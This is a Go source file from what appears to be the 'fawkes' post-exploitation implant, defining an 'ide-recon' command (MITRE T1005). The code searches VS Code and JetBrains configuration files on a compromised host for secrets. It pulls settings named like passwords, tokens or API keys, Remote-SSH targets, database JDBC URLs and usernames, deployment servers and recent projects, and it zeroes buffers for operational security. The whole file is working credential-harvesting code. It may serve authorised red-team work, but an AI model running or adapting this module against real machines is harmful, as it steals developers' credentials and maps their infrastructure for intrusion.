package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"fawkes/pkg/structs"
)

// IdeReconCommand enumerates IDE configurations for intelligence gathering.
type IdeReconCommand struct{}

func (c *IdeReconCommand) Name() string        { return "ide-recon" }
func (c *IdeReconCommand) Description() string { return "Enumerate IDE configurations — extensions, remote hosts, recent projects, secrets (T1005)" }

type ideReconArgs struct {
	Action string `json:"action"` // vscode, jetbrains, all
	User   string `json:"user"`   // Optional user filter
}

func (c *IdeReconCommand) Execute(task structs.Task) structs.CommandResult {
	var args ideReconArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			parts := strings.Fields(task.Params)
			args.Action = parts[0]
			if len(parts) > 1 {
				args.User = parts[1]
			}
		}
	}
	if args.Action == "" {
		args.Action = "all"
	}

	homes := ideGetUserHomes(args.User)
	if len(homes) == 0 {
		return errorResult("Error: could not determine user home directories")
	}

	var sb strings.Builder
	sb.WriteString("IDE Reconnaissance\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n")

	switch strings.ToLower(args.Action) {
	case "vscode":
		ideReconVSCode(&sb, homes)
	case "jetbrains":
		ideReconJetBrains(&sb, homes)
	case "all":
		ideReconVSCode(&sb, homes)
		sb.WriteString("\n")
		ideReconJetBrains(&sb, homes)
	default:
		return errorf("Unknown action: %s. Use: vscode, jetbrains, all", args.Action)
	}

	return successResult(sb.String())
}

// ideGetUserHomes returns home directories to scan.
func ideGetUserHomes(filterUser string) []string {
	if filterUser != "" {
		// Try to find specific user's home
		if runtime.GOOS == "windows" {
			home := filepath.Join(`C:\Users`, filterUser)
			if info, err := os.Stat(home); err == nil && info.IsDir() {
				return []string{home}
			}
		}
	}
	// Fall back to current user's home
	home, err := os.UserHomeDir()
	if err != nil {
		return nil
	}
	return []string{home}
}

// ideReconVSCode scans VS Code configuration directories.
func ideReconVSCode(sb *strings.Builder, homes []string) {
	sb.WriteString("\n--- VS Code ---\n")

	for _, home := range homes {
		configDirs := ideVSCodeConfigDirs(home)

		foundAny := false
		for _, configDir := range configDirs {
			if _, err := os.Stat(configDir); err != nil {
				continue
			}
			foundAny = true
			sb.WriteString(fmt.Sprintf("\n[Config: %s]\n", configDir))

			// Extensions
			extDir := filepath.Join(home, ".vscode", "extensions")
			if runtime.GOOS == "windows" {
				extDir = filepath.Join(home, ".vscode", "extensions")
			}
			ideVSCodeExtensions(sb, extDir)

			// Settings
			settingsPath := filepath.Join(configDir, "User", "settings.json")
			ideVSCodeSettings(sb, settingsPath)

			// Remote SSH config (from VS Code settings)
			ideVSCodeRemoteSSH(sb, settingsPath)

			// Recent files/workspaces
			ideVSCodeRecent(sb, configDir)

			// Keybindings (look for custom tooling)
			keybindingsPath := filepath.Join(configDir, "User", "keybindings.json")
			if info, err := os.Stat(keybindingsPath); err == nil && info.Size() > 2 {
				sb.WriteString(fmt.Sprintf("  Custom keybindings: %s (%d bytes)\n", keybindingsPath, info.Size()))
			}
		}

		if !foundAny {
			sb.WriteString(fmt.Sprintf("  VS Code not found for %s\n", home))
		}
	}
}

// ideVSCodeConfigDirs returns platform-specific VS Code config directories.
func ideVSCodeConfigDirs(home string) []string {
	switch runtime.GOOS {
	case "darwin":
		return []string{
			filepath.Join(home, "Library", "Application Support", "Code"),
			filepath.Join(home, "Library", "Application Support", "Code - Insiders"),
		}
	case "linux":
		return []string{
			filepath.Join(home, ".config", "Code"),
			filepath.Join(home, ".config", "Code - Insiders"),
		}
	case "windows":
		appdata := os.Getenv("APPDATA")
		if appdata == "" {
			appdata = filepath.Join(home, "AppData", "Roaming")
		}
		return []string{
			filepath.Join(appdata, "Code"),
			filepath.Join(appdata, "Code - Insiders"),
		}
	default:
		return []string{filepath.Join(home, ".config", "Code")}
	}
}

// ideVSCodeExtensions lists installed VS Code extensions.
func ideVSCodeExtensions(sb *strings.Builder, extDir string) {
	entries, err := os.ReadDir(extDir)
	if err != nil {
		return
	}

	var exts []string
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		name := e.Name()
		if strings.HasPrefix(name, ".") {
			continue
		}
		exts = append(exts, name)
	}

	if len(exts) == 0 {
		return
	}

	sb.WriteString(fmt.Sprintf("  Extensions (%d):\n", len(exts)))

	// Categorize interesting extensions
	securityExts, remoteExts, otherExts := ideCategorizExtensions(exts)

	if len(securityExts) > 0 {
		sb.WriteString("    [Security/DevOps]:\n")
		for _, ext := range securityExts {
			sb.WriteString(fmt.Sprintf("      %s\n", ext))
		}
	}
	if len(remoteExts) > 0 {
		sb.WriteString("    [Remote/SSH/Container]:\n")
		for _, ext := range remoteExts {
			sb.WriteString(fmt.Sprintf("      %s\n", ext))
		}
	}
	if len(otherExts) > 0 {
		sb.WriteString(fmt.Sprintf("    [Other] (%d extensions)\n", len(otherExts)))
		// Only show first 20 to keep output manageable
		limit := len(otherExts)
		if limit > 20 {
			limit = 20
		}
		for _, ext := range otherExts[:limit] {
			sb.WriteString(fmt.Sprintf("      %s\n", ext))
		}
		if len(otherExts) > 20 {
			sb.WriteString(fmt.Sprintf("      ... and %d more\n", len(otherExts)-20))
		}
	}
}

// ideCategorizExtensions sorts extensions into categories based on name patterns.
func ideCategorizExtensions(exts []string) (security, remote, other []string) {
	for _, ext := range exts {
		lower := strings.ToLower(ext)
		switch {
		case ideMatchesAny(lower, "docker", "kubernetes", "k8s", "terraform", "ansible",
			"vault", "aws", "azure", "gcp", "security", "snyk", "sonar", "devsec",
			"owasp", "trivy", "checkov", "sentinel", "defender"):
			security = append(security, ext)
		case ideMatchesAny(lower, "remote", "ssh", "wsl", "container", "tunnel",
			"dev-container", "devcontainer", "codespace"):
			remote = append(remote, ext)
		default:
			other = append(other, ext)
		}
	}
	return
}

// ideMatchesAny returns true if s contains any of the patterns.
func ideMatchesAny(s string, patterns ...string) bool {
	for _, p := range patterns {
		if strings.Contains(s, p) {
			return true
		}
	}
	return false
}

// ideVSCodeSettings reads and extracts interesting settings.
func ideVSCodeSettings(sb *strings.Builder, settingsPath string) {
	data, err := os.ReadFile(settingsPath)
	if err != nil {
		return
	}
	defer structs.ZeroBytes(data) // opsec: may contain API keys, tokens, proxy creds

	// Parse as generic JSON map
	var settings map[string]interface{}
	if err := json.Unmarshal(data, &settings); err != nil {
		sb.WriteString(fmt.Sprintf("  Settings: %s (parse error: %v)\n", settingsPath, err))
		return
	}

	// Extract interesting settings
	interesting := ideExtractInterestingSettings(settings)
	if len(interesting) == 0 {
		return
	}

	sb.WriteString("  Interesting settings:\n")
	for _, item := range interesting {
		sb.WriteString(fmt.Sprintf("    %s\n", item))
	}
}

// ideExtractInterestingSettings pulls out security-relevant settings.
func ideExtractInterestingSettings(settings map[string]interface{}) []string {
	var items []string

	interestingKeys := []string{
		"http.proxy", "http.proxyStrictSSL",
		"remote.SSH.remotePlatform", "remote.SSH.configFile",
		"remote.SSH.defaultExtensions", "remote.SSH.connectTimeout",
		"terminal.integrated.defaultProfile", "terminal.integrated.shell",
		"git.path", "python.defaultInterpreterPath",
		"docker.host", "docker.context",
		"aws.profile", "aws.region",
	}

	for _, key := range interestingKeys {
		if val, ok := settings[key]; ok {
			items = append(items, fmt.Sprintf("%s = %v", key, val))
		}
	}

	// Check for any setting containing "password", "token", "secret", "credential"
	for key, val := range settings {
		lower := strings.ToLower(key)
		if strings.Contains(lower, "password") || strings.Contains(lower, "token") ||
			strings.Contains(lower, "secret") || strings.Contains(lower, "credential") ||
			strings.Contains(lower, "apikey") || strings.Contains(lower, "api_key") {
			valStr := fmt.Sprintf("%v", val)
			if len(valStr) > 100 {
				valStr = valStr[:100] + "..."
			}
			items = append(items, fmt.Sprintf("[SENSITIVE] %s = %s", key, valStr))
		}
	}

	return items
}

// ideVSCodeRemoteSSH extracts Remote-SSH host configurations.
func ideVSCodeRemoteSSH(sb *strings.Builder, settingsPath string) {
	data, err := os.ReadFile(settingsPath)
	if err != nil {
		return
	}
	defer structs.ZeroBytes(data) // opsec: contains SSH host configs, credentials

	var settings map[string]interface{}
	if err := json.Unmarshal(data, &settings); err != nil {
		return
	}

	// remote.SSH.remotePlatform maps hostname → platform
	if platforms, ok := settings["remote.SSH.remotePlatform"]; ok {
		if platformMap, ok := platforms.(map[string]interface{}); ok && len(platformMap) > 0 {
			sb.WriteString("  Remote SSH targets:\n")
			for host, platform := range platformMap {
				sb.WriteString(fmt.Sprintf("    %s (%v)\n", host, platform))
			}
		}
	}

	// remote.SSH.configFile — custom SSH config path
	if configFile, ok := settings["remote.SSH.configFile"]; ok {
		sb.WriteString(fmt.Sprintf("  SSH config file: %v\n", configFile))
	}
}

// ideVSCodeRecent reads recently opened files and workspaces.
func ideVSCodeRecent(sb *strings.Builder, configDir string) {
	// VS Code stores recent items in storage.json or state.vscdb (SQLite)
	storagePath := filepath.Join(configDir, "User", "globalStorage", "storage.json")
	data, err := os.ReadFile(storagePath)
	if err != nil {
		// Try older location
		storagePath = filepath.Join(configDir, "storage.json")
		data, err = os.ReadFile(storagePath)
		if err != nil {
			return
		}
	}
	defer structs.ZeroBytes(data) // opsec: may contain project paths, workspace metadata

	recentPaths := ideParseVSCodeRecent(data)
	if len(recentPaths) == 0 {
		return
	}

	sb.WriteString(fmt.Sprintf("  Recent projects/files (%d):\n", len(recentPaths)))
	limit := len(recentPaths)
	if limit > 15 {
		limit = 15
	}
	for _, p := range recentPaths[:limit] {
		sb.WriteString(fmt.Sprintf("    %s\n", p))
	}
	if len(recentPaths) > 15 {
		sb.WriteString(fmt.Sprintf("    ... and %d more\n", len(recentPaths)-15))
	}
}

// ideParseVSCodeRecent extracts recent workspace paths from VS Code storage JSON.
func ideParseVSCodeRecent(data []byte) []string {
	var storage map[string]interface{}
	if err := json.Unmarshal(data, &storage); err != nil {
		return nil
	}

	var paths []string
	seen := make(map[string]bool)

	// Look for openedPathsList or recent entries
	for key, val := range storage {
		lower := strings.ToLower(key)
		if !strings.Contains(lower, "recent") && !strings.Contains(lower, "opened") &&
			!strings.Contains(lower, "workspace") && !strings.Contains(lower, "folder") {
			continue
		}

		// Recursively extract paths from the value
		ideCollectPaths(val, &paths, seen)
	}

	return paths
}

// ideCollectPaths recursively extracts file paths from nested JSON values.
func ideCollectPaths(val interface{}, paths *[]string, seen map[string]bool) {
	switch v := val.(type) {
	case string:
		for _, path := range ideExtractPathsFromString(v) {
			if !seen[path] {
				*paths = append(*paths, path)
				seen[path] = true
			}
		}
	case []interface{}:
		for _, item := range v {
			ideCollectPaths(item, paths, seen)
		}
	case map[string]interface{}:
		for _, mval := range v {
			ideCollectPaths(mval, paths, seen)
		}
	}
}

// ideExtractPathsFromString pulls file paths from a string (handles file:// URIs).
func ideExtractPathsFromString(s string) []string {
	var paths []string

	// Handle file:// URIs
	if strings.Contains(s, "file://") {
		parts := strings.Split(s, "file://")
		for _, p := range parts {
			p = strings.TrimSpace(p)
			if p == "" {
				continue
			}
			// Trim trailing commas, quotes, brackets
			p = strings.TrimRight(p, `",]}`)
			// URL-decode common patterns
			p = strings.ReplaceAll(p, "%20", " ")
			p = strings.ReplaceAll(p, "%3A", ":")
			if len(p) > 2 && (strings.HasPrefix(p, "/") || (len(p) > 3 && p[1] == ':')) {
				paths = append(paths, p)
			}
		}
		return paths
	}

	// Handle plain paths
	s = strings.Trim(s, `"[]`)
	if len(s) > 2 && (strings.HasPrefix(s, "/") || (len(s) > 3 && s[1] == ':')) {
		paths = append(paths, s)
	}

	return paths
}

// ideReconJetBrains scans JetBrains IDE configurations.
func ideReconJetBrains(sb *strings.Builder, homes []string) {
	sb.WriteString("\n--- JetBrains IDEs ---\n")

	for _, home := range homes {
		configBase := ideJetBrainsConfigBase(home)
		if configBase == "" {
			sb.WriteString(fmt.Sprintf("  JetBrains config directory not determined for %s\n", home))
			continue
		}

		// Discover installed JetBrains products
		products := ideDiscoverJetBrainsProducts(configBase)
		if len(products) == 0 {
			sb.WriteString("  No JetBrains IDEs found\n")
			continue
		}

		for _, product := range products {
			sb.WriteString(fmt.Sprintf("\n  [%s] %s\n", product.name, product.path))

			// Recent projects
			ideJetBrainsRecentProjects(sb, product.path)

			// Data sources (database connections)
			ideJetBrainsDataSources(sb, product.path)

			// Web servers / deployment targets
			ideJetBrainsDeployment(sb, product.path)
		}
	}
}

// ideJetBrainsConfigBase returns the JetBrains config base directory.
func ideJetBrainsConfigBase(home string) string {
	switch runtime.GOOS {
	case "darwin":
		return filepath.Join(home, "Library", "Application Support", "JetBrains")
	case "linux":
		return filepath.Join(home, ".config", "JetBrains")
	case "windows":
		appdata := os.Getenv("APPDATA")
		if appdata == "" {
			appdata = filepath.Join(home, "AppData", "Roaming")
		}
		return filepath.Join(appdata, "JetBrains")
	default:
		return filepath.Join(home, ".config", "JetBrains")
	}
}

type jetbrainsProduct struct {
	name string
	path string
}

// ideDiscoverJetBrainsProducts finds installed JetBrains IDE config directories.
func ideDiscoverJetBrainsProducts(configBase string) []jetbrainsProduct {
	entries, err := os.ReadDir(configBase)
	if err != nil {
		return nil
	}

	knownProducts := map[string]string{
		"IntelliJIdea": "IntelliJ IDEA",
		"PyCharm":      "PyCharm",
		"GoLand":       "GoLand",
		"WebStorm":     "WebStorm",
		"PhpStorm":     "PhpStorm",
		"CLion":        "CLion",
		"Rider":        "Rider",
		"RubyMine":     "RubyMine",
		"DataGrip":     "DataGrip",
		"Fleet":        "Fleet",
	}

	var products []jetbrainsProduct
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		dirName := e.Name()
		for prefix, productName := range knownProducts {
			if strings.HasPrefix(dirName, prefix) {
				products = append(products, jetbrainsProduct{
					name: productName + " (" + dirName + ")",
					path: filepath.Join(configBase, dirName),
				})
				break
			}
		}
	}

	return products
}

// ideJetBrainsRecentProjects reads recent project paths from JetBrains config.
func ideJetBrainsRecentProjects(sb *strings.Builder, productPath string) {
	recentPath := filepath.Join(productPath, "options", "recentProjects.xml")
	data, err := os.ReadFile(recentPath)
	if err != nil {
		// Try alternate location
		recentPath = filepath.Join(productPath, "options", "recentSolutions.xml")
		data, err = os.ReadFile(recentPath)
		if err != nil {
			return
		}
	}

	projects := ideParseJetBrainsRecentXML(string(data))
	if len(projects) == 0 {
		return
	}

	sb.WriteString(fmt.Sprintf("    Recent projects (%d):\n", len(projects)))
	limit := len(projects)
	if limit > 10 {
		limit = 10
	}
	for _, p := range projects[:limit] {
		sb.WriteString(fmt.Sprintf("      %s\n", p))
	}
	if len(projects) > 10 {
		sb.WriteString(fmt.Sprintf("      ... and %d more\n", len(projects)-10))
	}
}

// ideParseJetBrainsRecentXML extracts project paths from JetBrains XML config.
func ideParseJetBrainsRecentXML(content string) []string {
	var paths []string
	seen := make(map[string]bool)

	// JetBrains stores paths with $USER_HOME$ or $PROJECT_DIR$ variables
	// Look for key="..." value patterns containing paths
	for _, line := range strings.Split(content, "\n") {
		line = strings.TrimSpace(line)

		// Match entry key="path" or value="path"
		for _, attr := range []string{`key="`, `value="`} {
			idx := strings.Index(line, attr)
			if idx < 0 {
				continue
			}
			start := idx + len(attr)
			end := strings.Index(line[start:], `"`)
			if end < 0 {
				continue
			}
			val := line[start : start+end]

			// Expand $USER_HOME$
			val = strings.ReplaceAll(val, "$USER_HOME$", "~")

			// Only include paths that look like file system paths
			if strings.HasPrefix(val, "/") || strings.HasPrefix(val, "~") ||
				(len(val) > 3 && val[1] == ':' && (val[2] == '\\' || val[2] == '/')) {
				if !seen[val] {
					paths = append(paths, val)
					seen[val] = true
				}
			}
		}
	}

	return paths
}

// ideJetBrainsDataSources reads database connection configurations.
func ideJetBrainsDataSources(sb *strings.Builder, productPath string) {
	dsPath := filepath.Join(productPath, "options", "dataSources.xml")
	data, err := os.ReadFile(dsPath)
	if err != nil {
		// Also check dataSources.local.xml for credentials
		dsPath = filepath.Join(productPath, "options", "dataSources.local.xml")
		data, err = os.ReadFile(dsPath)
		if err != nil {
			return
		}
	}
	defer structs.ZeroBytes(data) // opsec: contains database credentials, connection strings

	sources := ideParseJetBrainsDataSources(string(data))
	if len(sources) == 0 {
		return
	}

	sb.WriteString(fmt.Sprintf("    Data sources (%d):\n", len(sources)))
	for _, ds := range sources {
		sb.WriteString(fmt.Sprintf("      %s\n", ds))
	}
}

// ideParseJetBrainsDataSources extracts database connection info from JetBrains XML.
func ideParseJetBrainsDataSources(content string) []string {
	var sources []string

	var currentName string
	for _, line := range strings.Split(content, "\n") {
		line = strings.TrimSpace(line)

		// Extract data source name
		if strings.Contains(line, `name="`) && strings.Contains(line, "data-source") {
			if name := ideExtractXMLAttr(line, "name"); name != "" {
				currentName = name
			}
		}

		// Extract JDBC URL
		if strings.Contains(line, "jdbc") || strings.Contains(line, "url") {
			if url := ideExtractXMLAttr(line, "value"); url != "" {
				if strings.Contains(url, "jdbc:") || strings.Contains(url, "://") {
					label := url
					if currentName != "" {
						label = currentName + ": " + url
					}
					if len(label) > 150 {
						label = label[:150] + "..."
					}
					sources = append(sources, label)
				}
			}
		}

		// Extract username
		if strings.Contains(line, "user") {
			if user := ideExtractXMLAttr(line, "value"); user != "" && !strings.Contains(user, "jdbc:") {
				if currentName != "" {
					sources = append(sources, currentName+" user: "+user)
				}
			}
		}
	}

	return sources
}

// ideExtractXMLAttr extracts the value of a named attribute from an XML tag string.
func ideExtractXMLAttr(line, attr string) string {
	search := attr + `="`
	idx := strings.Index(line, search)
	if idx < 0 {
		return ""
	}
	start := idx + len(search)
	end := strings.Index(line[start:], `"`)
	if end < 0 {
		return ""
	}
	return line[start : start+end]
}

// ideJetBrainsDeployment reads deployment/server configurations.
func ideJetBrainsDeployment(sb *strings.Builder, productPath string) {
	deployPath := filepath.Join(productPath, "options", "webServers.xml")
	data, err := os.ReadFile(deployPath)
	if err != nil {
		return
	}
	defer structs.ZeroBytes(data) // opsec: contains deployment server credentials

	servers := ideParseJetBrainsServers(string(data))
	if len(servers) == 0 {
		return
	}

	sb.WriteString(fmt.Sprintf("    Deployment servers (%d):\n", len(servers)))
	for _, s := range servers {
		sb.WriteString(fmt.Sprintf("      %s\n", s))
	}
}

// ideParseJetBrainsServers extracts server configurations from JetBrains XML.
func ideParseJetBrainsServers(content string) []string {
	var servers []string

	var currentName string
	for _, line := range strings.Split(content, "\n") {
		line = strings.TrimSpace(line)

		if strings.Contains(line, `name="`) && (strings.Contains(line, "server") || strings.Contains(line, "Server")) {
			if name := ideExtractXMLAttr(line, "name"); name != "" {
				currentName = name
			}
		}

		if strings.Contains(line, "host") || strings.Contains(line, "url") {
			if host := ideExtractXMLAttr(line, "value"); host != "" {
				label := host
				if currentName != "" {
					label = currentName + ": " + host
				}
				servers = append(servers, label)
			}
			if host := ideExtractXMLAttr(line, "host"); host != "" {
				label := host
				if currentName != "" {
					label = currentName + ": " + host
				}
				servers = append(servers, label)
			}
		}
	}

	return servers
}
